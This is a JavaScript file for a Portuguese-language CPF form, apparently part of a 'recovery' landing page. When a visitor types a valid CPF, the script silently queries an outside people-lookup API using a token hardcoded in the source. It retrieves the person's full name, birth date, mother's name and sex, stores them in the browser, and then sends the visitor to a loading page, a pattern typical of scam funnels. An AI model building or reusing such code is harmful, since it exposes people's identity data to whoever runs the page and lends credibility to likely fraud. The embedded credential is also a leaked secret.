const consultForm = document.getElementById('consultForm');
const cpfInput = document.getElementById('cpfInput');
const submitBtn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');
const btnSpinner = document.getElementById('btnSpinner');
const cpfError = document.getElementById('cpfError');
const cpfLoadingSpinner = document.getElementById('cpfLoadingSpinner');
const autoNameBox = document.getElementById('autoNameBox');
const fetchedFullName = document.getElementById('fetchedFullName');

const ZAPGROUP_TOKEN = 'c93601cbe0fce3f5c5b1e3b40c840f500fb162f91103beb42e839b7839813f93';

let currentCpfQueried = '';
let fetchController = null;
let isFetchingData = false;

// CPF Mask & Live Consultation
cpfInput.addEventListener('input', (e) => {
  let v = e.target.value.replace(/\D/g, '');
  if (v.length > 11) v = v.substring(0, 11);

  if (v.length > 9) {
    v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
  } else if (v.length > 6) {
    v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
  } else if (v.length > 3) {
    v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
  }

  e.target.value = v;

  if (cpfInput.classList.contains('error')) {
    cpfInput.classList.remove('error');
    if (cpfError) cpfError.classList.remove('visible');
  }

  const rawCpf = v.replace(/\D/g, '');

  if (rawCpf !== currentCpfQueried) {
    // Se o CPF mudou, esconde o box do nome até a nova consulta
    if (autoNameBox) autoNameBox.classList.add('hidden');
    if (fetchedFullName) fetchedFullName.textContent = '---';
    localStorage.removeItem('recupera_nome');
    localStorage.removeItem('recupera_nascimento');
    localStorage.removeItem('recupera_mae');
    localStorage.removeItem('recupera_sexo');
  }

  updateButtonState();

  if (rawCpf.length === 11 && isValidCPF(rawCpf)) {
    if (rawCpf !== currentCpfQueried) {
      consultarDadosCpf(rawCpf);
    }
  } else {
    if (fetchController) {
      fetchController.abort();
      fetchController = null;
    }
    if (cpfLoadingSpinner) cpfLoadingSpinner.classList.remove('active');
  }
});

// Validação matemática de CPF (dígitos verificadores)
function isValidCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += parseInt(cpf[i]) * (10 - i);
  let rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(cpf[9])) return false;
  sum = 0;
  for (let i = 0; i < 10; i++) sum += parseInt(cpf[i]) * (11 - i);
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(cpf[10])) return false;
  return true;
}

// Consulta de dados na API ZapGroup
async function consultarDadosCpf(cpf) {
  if (fetchController) {
    fetchController.abort();
  }
  fetchController = new AbortController();
  const signal = fetchController.signal;

  currentCpfQueried = cpf;
  isFetchingData = true;
  if (cpfLoadingSpinner) cpfLoadingSpinner.classList.add('active');

  let dados = null;

  try {
    // 1. Tenta API direta ZapGroup (com suporte a CORS)
    const zapUrl = `https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=${cpf}&token=${ZAPGROUP_TOKEN}`;
    const res = await Promise.race([
      fetch(zapUrl, { signal }),
      new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 6000))
    ]);

    if (res.ok) {
      const data = await res.json();
      if (data && (data.nome || data.cpf)) {
        dados = data;
      }
    }
  } catch (err) {
    if (signal.aborted) return;
    // 2. Fallback via proxy Node se API direta falhar
    try {
      const resProxy = await Promise.race([
        fetch(`/api/consulta-cpf?cpf=${cpf}`, { signal }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
      ]);
      if (resProxy.ok) {
        const dataProxy = await resProxy.json();
        if (dataProxy && dataProxy.nome) {
          dados = dataProxy;
        }
      }
    } catch (e2) {}
  }

  if (signal.aborted) return;

  isFetchingData = false;
  if (cpfLoadingSpinner) cpfLoadingSpinner.classList.remove('active');

  if (dados && dados.nome) {
    const nomeLimpo = dados.nome.trim().toUpperCase();
    if (fetchedFullName) fetchedFullName.textContent = nomeLimpo;
    if (autoNameBox) autoNameBox.classList.remove('hidden');

    localStorage.setItem('recupera_nome', nomeLimpo);
    localStorage.setItem('recupera_cpf', cpf);
    localStorage.setItem('recupera_cpf_formatted', cpfInput.value);
    if (dados.nascimento) localStorage.setItem('recupera_nascimento', dados.nascimento);
    if (dados.mae) localStorage.setItem('recupera_mae', dados.mae);
    if (dados.sexo) localStorage.setItem('recupera_sexo', dados.sexo);
  }

  updateButtonState();
}

// Atualiza estado do botão conforme CPF
function updateButtonState() {
  const rawCpf = cpfInput.value.replace(/\D/g, '');
  const cpfComplete = rawCpf.length === 11;
  const cpfMathValid = cpfComplete && isValidCPF(rawCpf);

  if (cpfComplete && !cpfMathValid) {
    cpfInput.classList.add('error');
    if (cpfError) {
      cpfError.textContent = 'CPF inválido. Verifique se foi digitado corretamente.';
      cpfError.classList.add('visible');
    }
  } else if (cpfComplete && cpfMathValid) {
    cpfInput.classList.remove('error');
    if (cpfError) cpfError.classList.remove('visible');
  }

  if (cpfMathValid) {
    submitBtn.disabled = false;
    submitBtn.classList.remove('disabled');
    submitBtn.classList.add('active-btn');
    btnText.textContent = 'CONTINUAR';
  } else {
    submitBtn.disabled = true;
    submitBtn.classList.add('disabled');
    submitBtn.classList.remove('active-btn');

    if (rawCpf.length === 0) {
      btnText.textContent = 'DIGITE O CPF PARA CONTINUAR';
    } else if (rawCpf.length < 11) {
      btnText.textContent = 'DIGITE O CPF COMPLETO (11 DÍGITOS)';
    } else {
      btnText.textContent = 'CPF INVÁLIDO';
    }
  }
}

// Submit
submitBtn.addEventListener('click', (e) => {
  e.preventDefault();
  handleConsultation();
});

function handleConsultation() {
  const rawCpf = cpfInput.value.replace(/\D/g, '');

  if (!isValidCPF(rawCpf)) {
    cpfInput.classList.add('error');
    if (cpfError) {
      cpfError.textContent = 'CPF inválido. Verifique se foi digitado corretamente.';
      cpfError.classList.add('visible');
    }
    cpfInput.focus();
    return;
  }

  localStorage.setItem('recupera_cpf', rawCpf);
  localStorage.setItem('recupera_cpf_formatted', cpfInput.value);

  var params = window.location.search;
  window.location.href = 'loading.html' + (params ? params : '');
}

document.addEventListener('DOMContentLoaded', updateButtonState);

